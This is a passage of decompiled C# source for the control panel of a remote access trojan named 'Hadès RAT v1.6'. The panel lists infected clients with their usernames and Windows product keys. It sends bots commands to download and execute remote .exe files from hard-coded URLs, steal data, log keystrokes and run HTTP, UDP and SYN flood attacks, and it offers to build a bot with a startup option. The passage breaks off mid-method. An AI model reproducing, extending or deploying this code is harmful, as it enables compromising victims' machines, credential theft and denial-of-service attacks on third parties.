            this.RichTextBox3.Location = point;
            this.RichTextBox3.Name = "RichTextBox3";
            size = new Size(350, 0x9a);
            this.RichTextBox3.Size = size;
            this.RichTextBox3.TabIndex = 9;
            this.RichTextBox3.Text = "";
            point = new Point(0x1fa, -145);
            this.RichTextBox4.Location = point;
            this.RichTextBox4.Name = "RichTextBox4";
            size = new Size(0xe4, 0x86);
            this.RichTextBox4.Size = size;
            this.RichTextBox4.TabIndex = 2;
            this.RichTextBox4.Text = "";
            this.SideTab1.Alignment = TabAlignment.Left;
            this.SideTab1.Controls.Add(this.TabPage1);
            this.SideTab1.Controls.Add(this.TabPage2);
            this.SideTab1.Controls.Add(this.TabPage4);
            this.SideTab1.Controls.Add(this.TabPage5);
            this.SideTab1.Controls.Add(this.TabPage3);
            this.SideTab1.Dock = DockStyle.Fill;
            this.SideTab1.method_1(50);
            size = new Size(0x2c, 0x88);
            this.SideTab1.ItemSize = size;
            point = new Point(0, 0x18);
            this.SideTab1.Location = point;
            this.SideTab1.Multiline = true;
            this.SideTab1.Name = "SideTab1";
            this.SideTab1.SelectedIndex = 0;
            size = new Size(0x4bd, 0x128);
            this.SideTab1.Size = size;
            this.SideTab1.SizeMode = TabSizeMode.Fixed;
            this.SideTab1.TabIndex = 5;
            this.TabPage1.BackColor = Color.White;
            this.TabPage1.Controls.Add(this.RichTextBox2);
            this.TabPage1.Controls.Add(this.lstClients);
            point = new Point(140, 4);
            this.TabPage1.Location = point;
            this.TabPage1.Name = "TabPage1";
            Padding padding = new Padding(3);
            this.TabPage1.Padding = padding;
            size = new Size(0x42d, 0x120);
            this.TabPage1.Size = size;
            this.TabPage1.TabIndex = 0;
            this.TabPage1.Text = "Connections";
            point = new Point(0x31, -135);
            this.RichTextBox2.Location = point;
            this.RichTextBox2.Name = "RichTextBox2";
            size = new Size(100, 0x60);
            this.RichTextBox2.Size = size;
            this.RichTextBox2.TabIndex = 1;
            this.RichTextBox2.Text = "";
            this.lstClients.BackColor = SystemColors.Window;
            this.lstClients.Columns.AddRange(new ColumnHeader[] { this.lstipaddress, this.lstversion, this.lststatus, this.lstcpname, this.lstusername, this.lstwinprckey, this.lstopsys, this.lstcountry, this.lstping });
            this.lstClients.ContextMenuStrip = this.ContextMenuStrip1;
            this.lstClients.Dock = DockStyle.Fill;
            this.lstClients.FullRowSelect = true;
            point = new Point(3, 3);
            this.lstClients.Location = point;
            this.lstClients.Name = "lstClients";
            size = new Size(0x427, 0x11a);
            this.lstClients.Size = size;
            this.lstClients.SmallImageList = this.ImageList1;
            this.lstClients.Sorting = SortOrder.Ascending;
            this.lstClients.TabIndex = 0;
            this.lstClients.UseCompatibleStateImageBehavior = false;
            this.lstClients.View = View.Details;
            this.lstipaddress.Text = "IP Address";
            this.lstipaddress.Width = 100;
            this.lstversion.Text = "Version";
            this.lstversion.TextAlign = HorizontalAlignment.Center;
            this.lstversion.Width = 50;
            this.lststatus.Text = "Status";
            this.lststatus.Width = 0x9e;
            this.lstcpname.Text = "Computer Name";
            this.lstcpname.Width = 0x8a;
            this.lstusername.Text = "Username";
            this.lstusername.Width = 0x87;
            this.lstwinprckey.Text = "Windows Product Key";
            this.lstwinprckey.Width = 0x74;
            this.lstopsys.Text = "Operating System";
            this.lstopsys.Width = 0xaf;
            this.lstcountry.Text = "Country";
            this.lstcountry.Width = 0x8f;
            this.lstping.Text = "Ping";
            this.lstping.Width = 0x2c;
            this.TabPage2.BackColor = Color.White;
            this.TabPage2.Controls.Add(this.ListView1);
            point = new Point(140, 4);
            this.TabPage2.Location = point;
            this.TabPage2.Name = "TabPage2";
            padding = new Padding(3);
            this.TabPage2.Padding = padding;
            size = new Size(0x42d, 0x120);
            this.TabPage2.Size = size;
            this.TabPage2.TabIndex = 1;
            this.TabPage2.Text = "History";
            this.ListView1.Columns.AddRange(new ColumnHeader[] { this.ColumnHeader7, this.ColumnHeader8 });
            this.ListView1.ContextMenuStrip = this.ContextMenuStrip2;
            this.ListView1.Dock = DockStyle.Fill;
            this.ListView1.FullRowSelect = true;
            this.ListView1.GridLines = true;
            point = new Point(3, 3);
            this.ListView1.Location = point;
            this.ListView1.Name = "ListView1";
            size = new Size(0x427, 0x11a);
            this.ListView1.Size = size;
            this.ListView1.TabIndex = 0;
            this.ListView1.UseCompatibleStateImageBehavior = false;
            this.ListView1.View = View.Details;
            this.ColumnHeader7.Text = "Date and Time";
            this.ColumnHeader7.Width = 0x95;
            this.ColumnHeader8.Text = "Action";
            this.ColumnHeader8.Width = 0x326;
            this.TabPage4.BackColor = Color.White;
            this.TabPage4.Controls.Add(this.Win8Progressbar1);
            this.TabPage4.Controls.Add(this.Button1);
            this.TabPage4.Controls.Add(this.CheckBox1);
            this.TabPage4.Controls.Add(this.Label2);
            this.TabPage4.Controls.Add(this.TextBox1);
            this.TabPage4.Controls.Add(this.PictureBox1);
            point = new Point(140, 4);
            this.TabPage4.Location = point;
            this.TabPage4.Name = "TabPage4";
            size = new Size(0x42d, 0x120);
            this.TabPage4.Size = size;
            this.TabPage4.TabIndex = 3;
            this.TabPage4.Text = "Control from other device (iphone,android,ps3,psp ect..)";
            point = new Point(14, 0x47);
            this.Win8Progressbar1.Location = point;
            this.Win8Progressbar1.Name = "Win8Progressbar1";
            size = new Size(0x181, 0x17);
            this.Win8Progressbar1.Size = size;
            this.Win8Progressbar1.TabIndex = 5;
            point = new Point(14, 100);
            this.Button1.Location = point;
            this.Button1.Name = "Button1";
            size = new Size(0x181, 0x2b);
            this.Button1.Size = size;
            this.Button1.TabIndex = 3;
            this.Button1.Text = ":: Build Bot.exe ::";
            this.Button1.UseVisualStyleBackColor = true;
            this.CheckBox1.AutoSize = true;
            point = new Point(0x12f, 0x2e);
            this.CheckBox1.Location = point;
            this.CheckBox1.Name = "CheckBox1";
            size = new Size(0x60, 0x11);
            this.CheckBox1.Size = size;
            this.CheckBox1.TabIndex = 2;
            this.CheckBox1.Text = "Add to startup";
            this.CheckBox1.UseVisualStyleBackColor = true;
            this.Label2.AutoSize = true;
            point = new Point(0x26, 0x1c);
            this.Label2.Location = point;
            this.Label2.Name = "Label2";
            size = new Size(0xa7, 13);
            this.Label2.Size = size;
            this.Label2.TabIndex = 1;
            this.Label2.Text = "Url of webpanel + /commandes/ :";
            point = new Point(14, 0x2c);
            this.TextBox1.Location = point;
            this.TextBox1.Name = "TextBox1";
            size = new Size(0x11b, 0x15);
            this.TextBox1.Size = size;
            this.TextBox1.TabIndex = 0;
            this.TextBox1.Text = "http://www.webpanel.com/commandes/";
            this.PictureBox1.Image = Class5.smethod_72();
            point = new Point(0x15, 0x19);
            this.PictureBox1.Location = point;
            this.PictureBox1.Name = "PictureBox1";
            size = new Size(0x10, 0x10);
            this.PictureBox1.Size = size;
            this.PictureBox1.TabIndex = 4;
            this.PictureBox1.TabStop = false;
            this.TabPage5.BackColor = Color.White;
            this.TabPage5.Controls.Add(this.Button2);
            this.TabPage5.Controls.Add(this.TextBox2);
            this.TabPage5.Controls.Add(this.ComboBox1);
            point = new Point(140, 4);
            this.TabPage5.Location = point;
            this.TabPage5.Name = "TabPage5";
            size = new Size(0x42d, 0x120);
            this.TabPage5.Size = size;
            this.TabPage5.TabIndex = 4;
            this.TabPage5.Text = "On-join";
            point = new Point(0x114, 0x10);
            this.Button2.Location = point;
            this.Button2.Name = "Button2";
            size = new Size(0x4b, 0x17);
            this.Button2.Size = size;
            this.Button2.TabIndex = 2;
            this.Button2.Text = "Ok";
            this.Button2.UseVisualStyleBackColor = true;
            point = new Point(11, 0x12);
            this.TextBox2.Location = point;
            this.TextBox2.Name = "TextBox2";
            size = new Size(100, 0x15);
            this.TextBox2.Size = size;
            this.TextBox2.TabIndex = 1;
            this.TextBox2.Text = "Value";
            this.ComboBox1.FormattingEnabled = true;
            this.ComboBox1.Items.AddRange(new object[] { "ping", "Download & Execute" });
            point = new Point(0x75, 0x12);
            this.ComboBox1.Location = point;
            this.ComboBox1.Name = "ComboBox1";
            size = new Size(0x99, 0x15);
            this.ComboBox1.Size = size;
            this.ComboBox1.TabIndex = 0;
            this.TabPage3.BackColor = Color.White;
            point = new Point(140, 4);
            this.TabPage3.Location = point;
            this.TabPage3.Name = "TabPage3";
            size = new Size(0x42d, 0x120);
            this.TabPage3.Size = size;
            this.TabPage3.TabIndex = 2;
            this.TabPage3.Text = "News / Info";
            SizeF ef = new SizeF(6f, 13f);
            this.AutoScaleDimensions = ef;
            this.AutoScaleMode = AutoScaleMode.Font;
            this.BackColor = Color.FromArgb(0x40, 0x40, 0x40);
            size = new Size(0x4bd, 0x159);
            this.ClientSize = size;
            this.Controls.Add(this.RichTextBox3);
            this.Controls.Add(this.RichTextBox4);
            this.Controls.Add(this.textsteam);
            this.Controls.Add(this.SideTab1);
            this.Controls.Add(this.getloggg);
            this.Controls.Add(this.StatusStrip1);
            this.Controls.Add(this.MenuStrip1);
            this.DoubleBuffered = true;
            this.Icon = (Icon) manager.GetObject("$this.Icon");
            this.MainMenuStrip = this.MenuStrip1;
            this.Name = "Form1";
            this.StartPosition = FormStartPosition.CenterScreen;
            this.Text = "Had\x00e8s RAT v1.6";
            this.ContextMenuStrip1.ResumeLayout(false);
            this.MenuStrip1.ResumeLayout(false);
            this.MenuStrip1.PerformLayout();
            this.StatusStrip1.ResumeLayout(false);
            this.StatusStrip1.PerformLayout();
            this.ContextMenuStrip2.ResumeLayout(false);
            this.ContextMenuStrip3.ResumeLayout(false);
            this.SideTab1.ResumeLayout(false);
            this.TabPage1.ResumeLayout(false);
            this.TabPage2.ResumeLayout(false);
            this.TabPage4.ResumeLayout(false);
            this.TabPage4.PerformLayout();
            ((ISupportInitialize) this.PictureBox1).EndInit();
            this.TabPage5.ResumeLayout(false);
            this.TabPage5.PerformLayout();
            this.ResumeLayout(false);
            this.PerformLayout();
        }

        private void IPAdressToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.lstipaddress.Width == Conversions.ToDouble("0"))
            {
                this.lstipaddress.Width = Conversions.ToInteger("100");
            }
            else
            {
                this.lstipaddress.Width = Conversions.ToInteger("0");
            }
        }

        private void KeyloggzeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MessageBox.Show(@"Keylogger Log is saved on C:\Documents and Settings\Administrateur\Application Data\critical.txt", "Keylogger", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
        }

        private void KillToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.lstClients.SelectedItems.Count > 0)
            {
                Class2.Class4_0.method_18().ShowDialog();
                Class2.Class4_0.method_18().TextBox2.Focus();
            }
        }

        private void LanToolStripMenuItem_Click(object sender, EventArgs e)
        {
        }

        public void Listen()
        {
            this.tcpListener_0 = new TcpListener(IPAddress.Any, this.port);
            this.tcpListener_0.Start();
            while (true)
            {
                xRAT.Connection connection = new xRAT.Connection(this.tcpListener_0.AcceptTcpClient());
                connection.GotInfo += new xRAT.Connection.GotInfoEventHandler(this.GotInfo);
                connection.Disconnected += new xRAT.Connection.DisconnectedEventHandler(this.Disconnected);
            }
        }

        private void ListenToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!this.listening)
            {
                this.Invoke(new DelToggleListen(this.ToggleListen));
                this.thread_0 = new Thread(new ThreadStart(this.Listen));
                this.thread_0.IsBackground = true;
                this.thread_0.Start();
                this.Invoke(new RefreshDelegate(this.method_0));
            }
        }

        private void ListToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.lstClients.SelectedItems.Count > 0)
            {
                Class2.Class4_0.method_19().ShowDialog();
            }
        }

        public object LookUpDetails(string Address)
        {
            CountryLookup lookup = new CountryLookup(Application.StartupPath + @"\data\GeoIP.dat");
            string str2 = Address;
            CountryLookup lookup2 = lookup;
            return lookup2.LookupCountryName(str2);
        }

        private void MatrixScreenToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.lstClients.SelectedItems.Count > 0)
            {
                this.SendToSelected("DL|http://mes-images.voila.net/matrix.exe");
            }
        }

        private void MessageBoxToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if ((this.lstClients.SelectedItems.Count > 0) && (Class2.Class4_0.method_13().ShowDialog() == DialogResult.OK))
            {
                this.SendToSelected(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("MSGBOX|", Class2.Class4_0.method_13()._TEXT), "|"), Class2.Class4_0.method_13()._TITLE), "|"), Class2.Class4_0.method_13()._STYLE), "|"), Class2.Class4_0.method_13()._BUTTON)));
            }
        }

        public void method_0()
        {
            if (this.listening)
            {
                this.txtListening.ForeColor = Color.Green;
                this.txtListening.Text = "Listening on Port: " + Conversions.ToString(this.port);
            }
        }

        private void method_1(object sender, KeyPressEventArgs e)
        {
            int num = Strings.Asc(e.KeyChar);
            if (((num < 0x30) || (num > 0x39)) && (num != 8))
            {
                e.Handled = true;
            }
        }

        private void method_10(object sender, EventArgs e)
        {
        }

        private void method_11(object sender, EventArgs e)
        {
            this.ToolStripMenuItem2.ForeColor = Color.Black;
        }

        private void method_12(object sender, EventArgs e)
        {
            this.ToolStripMenuItem2.ForeColor = Color.Silver;
        }

        private void method_13(object sender, EventArgs e)
        {
            this.ExtraToolStripMenuItem.ForeColor = Color.Black;
        }

        private void method_14(object sender, EventArgs e)
        {
            this.ExtraToolStripMenuItem.ForeColor = Color.Silver;
        }

        private void method_15(object sender, EventArgs e)
        {
            this.FileToolStripMenuItem.ForeColor = Color.Black;
        }

        private void method_16(object sender, EventArgs e)
        {
            this.FileToolStripMenuItem.ForeColor = Color.Silver;
        }

        private void method_17(object sender, EventArgs e)
        {
            this.ServerEditorToolStripMenuItem.ForeColor = Color.Black;
        }

        private void method_18(object sender, EventArgs e)
        {
            this.ServerEditorToolStripMenuItem.ForeColor = Color.Silver;
        }

        private void method_19(object sender, EventArgs e)
        {
        }

        private void method_2(object sender, EventArgs e)
        {
        }

        private void method_20(object sender, EventArgs e)
        {
            if (this.lstClients.SelectedItems.Count > 0)
            {
                this.SendToSelected("WINBUGFENETRE");
            }
        }

        private void method_21(object sender, EventArgs e)
        {
        }

        private void method_22(object sender, EventArgs e)
        {
            if (this.lstClients.SelectedItems.Count > 0)
            {
                this.SendToSelected("SKYPEONLINES");
            }
        }

        private void method_23(object sender, EventArgs e)
        {
        }

        private void method_24(object sender, EventArgs e)
        {
            if (this.lstClients.SelectedItems.Count > 0)
            {
                this.SendToSelected(Conversions.ToString(Operators.ConcatenateObject("DL|", Class2.Class4_0.method_4().URL)));
            }
        }

        private void method_25(object sender, EventArgs e)
        {
        }

        private void method_26(object sender, EventArgs e)
        {
            this.SendToSelected("CLEARLOG");
        }

        private void method_3(object sender, EventArgs e)
        {
        }

        private void method_4(object sender, EventArgs e)
        {
        }

        private void method_5(object sender, EventArgs e)
        {
            try
            {
                Interaction.Shell(@"data\Hades_stub.exe", AppWinStyle.MinimizedFocus, false, -1);
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                MessageBox.Show("Error, file missing....", "Error of Antivirus", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                Application.Exit();
                ProjectData.ClearProjectError();
            }
            Class2.Class4_0.method_8().ShowDialog();
        }

        private void method_6(object sender, EventArgs e)
        {
        }

        private void method_7(object sender, EventArgs e)
        {
        }

        private void method_8(object sender, EventArgs e)
        {
            Class2.Class4_0.method_2().Show();
        }

        private void method_9(object sender, EventArgs e)
        {
        }

        private void NoipUpdateToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Class2.Class4_0.method_14().Show();
        }

        private void NotifyIcon1_MouseClick(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                this.Show();
            }
        }

        private void OkToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.lstClients.SelectedItems.Count > 0)
            {
                this.SendToSelected("PSPEAK|" + this.ToolStripTextBox1.Text);
            }
        }

        private void OkToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (this.lstClients.SelectedItems.Count > 0)
            {
                this.SendToSelected("SkipeS|" + this.ToolStripTextBox2.Text);
            }
        }

        private void OkToolStripMenuItem2_Click(object sender, EventArgs e)
        {
            if (this.lstClients.SelectedItems.Count > 0)
            {
                this.SendToSelected("ICEMSn|" + this.ToolStripTextBox3.Text);
            }
        }

        private void OkToolStripMenuItem3_Click(object sender, EventArgs e)
        {
            if (this.lstClients.SelectedItems.Count > 0)
            {
                this.SendToSelected("FIREMSn|" + this.ToolStripTextBox4.Text);
            }
        }

        private void OkToolStripMenuItem4_Click(object sender, EventArgs e)
        {
            if (this.lstClients.SelectedItems.Count > 0)
            {
                this.SendToSelected("STARTSSSUDP|" + this.ToolStripTextBox5.Text + "|" + this.ToolStripTextBox12.Text);
            }
        }

        private void OkToolStripMenuItem5_Click(object sender, EventArgs e)
        {
            if (this.lstClients.SelectedItems.Count > 0)
            {
                this.SendToSelected("SENDZIC|" + this.ToolStripTextBox6.Text);
            }
        }

        private void OkToolStripMenuItem6_Click(object sender, EventArgs e)
        {
            try
            {
                this.SendToSelected("SOCK7|" + this.ToolStripTextBox7.Text);
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
        }

        private void OkToolStripMenuItem7_Click(object sender, EventArgs e)
        {
            if (this.lstClients.SelectedItems.Count > 0)
            {
                this.SendToSelected("SFB|" + this.ToolStripTextBox13.Text);
            }
        }

        private void OpenCDToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.lstClients.SelectedItems.Count > 0)
            {
                this.SendToSelected("OPENDVD");
            }
        }

        private void OpenWebsiteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if ((this.lstClients.SelectedItems.Count > 0) && (Class2.Class4_0.method_16().ShowDialog() == DialogResult.OK))
            {
                this.SendToSelected(Conversions.ToString(Operators.ConcatenateObject("URL|", Class2.Class4_0.method_16().URL)));
            }
        }

        private void OSToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.lstopsys.Width == Conversions.ToDouble("0"))
            {
                this.lstopsys.Width = Conversions.ToInteger("180");
            }
            else
            {
                this.lstopsys.Width = Conversions.ToInteger("0");
            }
        }

        private void PingToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.lstping.Width == Conversions.ToDouble("0"))
            {
                this.lstping.Width = Conversions.ToInteger("40");
            }
            else
            {
                this.lstping.Width = Conversions.ToInteger("0");
            }
        }

        private void PortScannerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Class2.Class4_0.method_17().Show();
        }

        public void PrcList(string prcs)
        {
            Class2.Class4_0.method_19().ListView1.Items.Clear();
            string[] strArray2 = prcs.Split(new char[] { '|' });
            for (int i = 0; i < strArray2.Length; i++)
            {
                prcs = strArray2[i];
                Class2.Class4_0.method_19().ListView1.Items.Add(prcs);
            }
        }

        private void RandomCursorToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.lstClients.SelectedItems.Count > 0)
            {
                this.SendToSelected("DL|http://mes-images.voila.net/cursor.exe");
            }
        }

        private void RandomIconDesktopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.lstClients.SelectedItems.Count > 0)
            {
                this.SendToSelected("DL| http://mes-images.voila.net/fou.exe");
            }
        }

        private void RecordToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.lstClients.SelectedItems.Count > 0)
            {
                this.SendToSelected("STARTRECORD");
            }
        }

        private void RefreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            int num = this.lstClients.Items.Count - 1;
            for (int i = 0; i <= num; i++)
            {
                ListViewItem item = this.lstClients.Items[i];
                string text = item.Text;
                item.Text = text;
                this.lstClients.Items[i].SubItems[8].Text = Conversions.ToString(this.GetPingMs(ref text));
            }
        }

        public void RemoteDesk(Image deskimage, int bytecount)
        {
            Class2.Class4_0.method_20().PictureBox1.Image = deskimage;
            Class2.Class4_0.method_20().Label3.Text = "Size: " + Conversions.ToString(bytecount) + " KB";
        }

        private void RemoteDownloadExecuteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if ((this.lstClients.SelectedItems.Count > 0) && (Class2.Class4_0.method_4().ShowDialog() == DialogResult.OK))
            {
                this.SendToSelected(Conversions.ToString(Operators.ConcatenateObject("DL|", Class2.Class4_0.method_4().URL)));
            }
        }

        private void RemoteFileManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.lstClients.SelectedItems.Count > 0)
            {
                Class2.Class4_0.method_5().ShowDialog();
            }
        }

        public void Remove(xRAT.Connection client)
        {
            IEnumerator enumerator;
            string[] strArray;
            try
            {
                ListViewItem current;
                enumerator = this.lstClients.Items.GetEnumerator();
                while (enumerator.MoveNext())
                {
                    current = (ListViewItem) enumerator.Current;
                    if (Operators.ConditionalCompareObjectEqual(current.Text, client.Object_0, false))
                    {
                        goto Label_003E;
                    }
                }
                goto Label_0088;
            Label_003E:
                current.Remove();
                this.int_0--;
                this.txtOnline.Text = "Users Online: " + Conversions.ToString(this.int_0);
            }
            finally
            {
                if (enumerator is IDisposable)
                {
                    (enumerator as IDisposable).Dispose();
                }
            }
        Label_0088:
            strArray = new string[3];
            strArray[0] = Conversions.ToString(DateTime.Now);
            strArray[1] = Conversions.ToString(Operators.ConcatenateObject(client.Object_0, " disconnected."));
            ListViewItem item2 = new ListViewItem(strArray);
            this.ListView1.Items.Add(item2);
        }

        private void ResHackerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                Interaction.Shell(@"data\ResHacker.exe", AppWinStyle.MinimizedFocus, false, -1);
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
        }

        private void RestartToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.lstClients.SelectedItems.Count > 0)
            {
                this.SendToSelected("RESTART");
            }
        }

        private void RestartToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (this.lstClients.SelectedItems.Count > 0)
            {
                this.SendToSelected("SRESTART");
            }
        }

        public void SaveDownloadedFile(xRAT.Connection client, byte[] content, string name)
        {
            if (!Directory.Exists(Application.StartupPath + @"\Users"))
            {
                Directory.CreateDirectory(Application.StartupPath + @"\Users");
            }
            if (!Directory.Exists(Conversions.ToString(Operators.ConcatenateObject(Application.StartupPath + @"\Users\", client.Object_0))))
            {
                Directory.CreateDirectory(Conversions.ToString(Operators.ConcatenateObject(Application.StartupPath + @"\Users\", client.Object_0)));
            }
            System.IO.File.WriteAllBytes(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Application.StartupPath + @"\Users\", client.Object_0), @"\"), name)), content);
        }

        private void SaveToFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            StreamWriter writer = new StreamWriter(Application.StartupPath + @"\history.log", false);
            int num = this.ListView1.Items.Count - 1;
            for (int i = 0; i <= num; i++)
            {
                string str = "[" + this.ListView1.Items[i].Text + "]  " + this.ListView1.Items[i].SubItems[1].Text;
                writer.WriteLine(str);
            }
            writer.Close();
            writer.Dispose();
            string[] items = new string[3];
            items[0] = Conversions.ToString(DateTime.Now);
            items[1] = "History saved to \"" + Application.StartupPath + "\\history.log\".";
            ListViewItem item = new ListViewItem(items);
            this.ListView1.Items.Add(item);
        }

        [DllImport("user32.dll", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
        private static extern int SendMessageA(IntPtr intptr_0, int int_2, int int_3, int int_4);
        public void SendToAll(string Message)
        {
            IEnumerator enumerator;
            try
            {
                enumerator = this.lstClients.Items.GetEnumerator();
                while (enumerator.MoveNext())
                {
                    ListViewItem current = (ListViewItem) enumerator.Current;
                    try
                    {
                        ((xRAT.Connection) current.Tag).Send(Message);
                        continue;
                    }
                    catch (Exception exception1)
                    {
                        ProjectData.SetProjectError(exception1);
                        Exception exception = exception1;
                        Console.WriteLine(exception.Message);
                        ProjectData.ClearProjectError();
                        continue;
                    }
                }
            }
            finally
            {
                if (enumerator is IDisposable)
                {
                    (enumerator as IDisposable).Dispose();
                }
            }
        }

        public void SendToSelected(string Message)
        {
            IEnumerator enumerator;
            try
            {
                enumerator = this.lstClients.SelectedItems.GetEnumerator();
                while (enumerator.MoveNext())
                {
                    ListViewItem current = (ListViewItem) enumerator.Current;
                    try
                    {
                        ((xRAT.Connection) current.Tag).Send(Message);
                        continue;
                    }
                    catch (Exception exception1)
                    {
                        ProjectData.SetProjectError(exception1);
                        Exception exception = exception1;
                        Console.WriteLine(exception.Message);
                        ProjectData.ClearProjectError();
                        continue;
                    }
                }
            }
            finally
            {
                if (enumerator is IDisposable)
                {
                    (enumerator as IDisposable).Dispose();
                }
            }
        }

        private void SettingsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Class2.Class4_0.method_21().Show();
        }

        private void ShowSystemInformationToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.lstClients.SelectedItems.Count > 0)
            {
                this.SendToSelected("SYSINFO");
                Class2.Class4_0.method_24().ShowDialog();
            }
        }

        private void ShowTaskbarToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.lstClients.SelectedItems.Count > 0)
            {
                this.SendToSelected("voirlabarre");
            }
        }

        private void ShowToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.Show();
        }

        private void ShutdownToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.lstClients.SelectedItems.Count > 0)
            {
                this.SendToSelected("SHUTDOWN");
            }
        }

        private void StartToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.lstClients.SelectedItems.Count > 0)
            {
                this.SendToSelected("DDOSDRAIN|" + this.ToolStripTextBox8.Text);
            }
        }

        private void StartToolStripMenuItem2_Click(object sender, EventArgs e)
        {
            if (this.lstClients.SelectedItems.Count > 0)
            {
                this.SendToSelected("lancerlolbt");
            }
        }

        private void StartToolStripMenuItem3_Click(object sender, EventArgs e)
        {
            if (this.lstClients.SelectedItems.Count > 0)
            {
                Class2.Class4_0.method_18().ShowDialog();
                Class2.Class4_0.method_18().TextBox1.Focus();
            }
        }

        private void StartToolStripMenuItem4_Click(object sender, EventArgs e)
        {
            if ((this.lstClients.SelectedItems.Count > 0) && (Class2.Class4_0.method_10().ShowDialog() == DialogResult.OK))
            {
                this.SendToSelected(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("HTTPSTART|", Class2.Class4_0.method_10().HOST), "|"), Class2.Class4_0.method_10().TIME)));
            }
        }

        private void StartToolStripMenuItem5_Click(object sender, EventArgs e)
        {
            if ((this.lstClients.SelectedItems.Count > 0) && (Class2.Class4_0.method_25().ShowDialog() == DialogResult.OK))
            {
                this.SendToSelected(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("UDPSTART|", Class2.Class4_0.method_25().HOST), "|"), Class2.Class4_0.method_25().PORT)));
            }
        }

        private void StartToolStripMenuItem6_Click(object sender, EventArgs e)
        {
            if ((this.lstClients.SelectedItems.Count > 0) && (Class2.Class4_0.method_23().ShowDialog() == DialogResult.OK))
            {
                this.SendToSelected(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("SYNSTART|", Class2.Class4_0.method_23().HOST), "|"), Class2.Class4_0.method_23().PORT)));
            }
        }

        private void StatusToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.lststatus.Width == Conversions.ToDouble("0"))
            {
                this.lststatus.Width = Conversions.ToInteger("150");
            }
            else
            {
                this.lststatus.Width = Conversions.ToInteger("0");
            }
        }

        private void StealerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.lstClients.SelectedItems.Count > 0)
            {
                this.SendToSelected("SKEALDATO");
                Class2.Class4_0.method_22().ShowDialog();
            }
        }

        private void StopRecordToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.lstClients.SelectedItems.Count > 0)
            {
                this.SendToSelected("STOPRECORD");
            }
        }

        private void StopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.listening)
            {
                Application.Restart();
            }
        }

        private void StopToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (this.lstClients.SelectedItems.Count > 0)
            {
                this.SendToSelected("SRESTART");
            }
        }

        private void StopToolStripMenuItem2_Click(object sender, EventArgs e)
        {
            if (this.lstClients.SelectedItems.Count > 0)
            {
                this.SendToSelected("stopbtlol");
            }
        }

        private void StopToolStripMenuItem4_Click(object sender, EventArgs e)
        {
            if ((this.lstClients.SelectedItems.Count > 0) && (Class2.Class4_0.method_10().ShowDialog() == DialogResult.OK))
            {
                this.SendToSelected(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("HTTPSTOP|", Class2.Class4_0.method_10().HOST), "|"), Class2.Class4_0.method_10().TIME)));
            }
        }

        private void StopToolStripMenuItem5_Click(object sender, EventArgs e)
        {
            if (this.lstClients.SelectedItems.Count > 0)
            {
                this.SendToSelected("SYNSTOP");
            }
        }

        private void StopToolStripMenuItem6_Click(object sender, EventArgs e)
        {
            if (this.lstClients.SelectedItems.Count > 0)
            {
                this.SendToSelected("UDPSTOP");
            }
        }

        private void SwapMouseButtonToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.lstClients.SelectedItems.Count > 0)
            {
                this.SendToSelected("SWAPMOUSEBUTTON");
            }
        }

        private void TextBox2_TextChanged(object sender, EventArgs e)
        {
        }

        private void Timer1_Tick(object sender, EventArgs e)
        {
            if ((this.autorefreshact == 1) & this.listening)
            {
                int num2 = this.lstClients.Items.Count - 1;
                for (int i = 0; i <= num2; i++)
                {
                    ListViewItem item = this.lstClients.Items[i];
